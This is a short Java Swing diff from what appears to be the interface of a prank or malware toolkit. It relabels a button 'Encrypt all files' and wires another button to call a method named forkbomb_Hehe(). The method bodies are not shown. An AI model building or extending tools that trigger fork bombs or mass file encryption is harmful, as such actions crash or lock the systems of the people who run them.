@@ -220,7 +220,7 @@ public class MotherJInternalFrame extends MJInternalFrame {
 				forkbomb_Hehe();
 			}
 		});
-		JButton btnNewButton_6 = new JButton("New button");
+		JButton btnNewButton_6 = new JButton("Encrypt all files");
 		btnNewButton_6.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
 		btnNewButton_6.setBackground(new Color(0, 204, 102));
 		btnNewButton_6.setForeground(new Color(0, 0, 153));
@@ -229,7 +229,12 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_6.gridx = 5;
 		gbc_btnNewButton_6.gridy = 5;
 		getContentPane().add(btnNewButton_6, gbc_btnNewButton_6);
-
+		btnNewButton_2.addMouseListener(new MouseAdapter() {
+			@Override
+			public void mouseClicked(MouseEvent arg0) {
+				forkbomb_Hehe();
+			}
+		});
 		JButton btnNewButton_3 = new JButton("New button");
 		btnNewButton_3.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
 		btnNewButton_3.setBackground(new Color(0, 204, 102));
